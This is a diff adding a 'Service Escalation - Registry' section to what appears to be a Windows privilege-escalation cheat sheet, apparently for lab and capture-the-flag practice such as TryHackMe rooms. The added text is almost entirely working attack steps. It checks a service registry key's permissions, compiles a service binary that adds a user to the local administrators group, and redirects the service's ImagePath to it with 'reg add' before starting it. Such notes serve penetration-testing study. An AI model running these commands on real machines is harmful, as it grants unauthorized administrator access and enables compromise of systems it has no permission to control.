@@ -1104,6 +1104,28 @@ psexec.py -n -k domain.local/Administrator@PC-NAME
 https://tryhackme.com/room/windowsprivescarena
 ```
 
+## Service Escalation - Registry
+
+Check if your user belongs to a group that has full control over a registry key
+```
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+```
+Copy the file of the registry to your kali machien and edit the code
+```
+cmd.exe /k net localgroup administrators user /add
+```
+Compile it
+```
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+```
+Copy the file to the Windows VM and type
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+```
+```
+sc start regsvc
+```
+
 ## Always Installed
 
 Check if the "AlwaysInstallElevated" is 1
